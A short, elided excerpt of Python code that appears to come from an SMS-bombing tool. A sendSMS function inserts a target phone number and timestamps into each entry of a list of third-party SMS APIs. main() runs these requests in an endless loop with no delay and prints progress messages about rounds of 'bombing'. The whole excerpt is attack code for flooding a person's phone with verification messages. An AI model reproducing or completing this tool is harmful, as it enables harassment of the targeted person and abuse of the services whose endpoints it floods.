...
def sendSMS(API, phone):
    ...
    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time()))).replace("时间2",
                                                                                              str(int(time.time())))
    body = API.get('body')
    try:
        if body:
...
def main(phone):
    ...
    while i > 0:
        for API in APIS:
            ...
            # time.sleep(0)
        print({time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}, '第', i, '轮轰炸完成！等待0秒后，开始第', i + 1, '轮轰炸！')
        time.sleep(0)
        i += 1
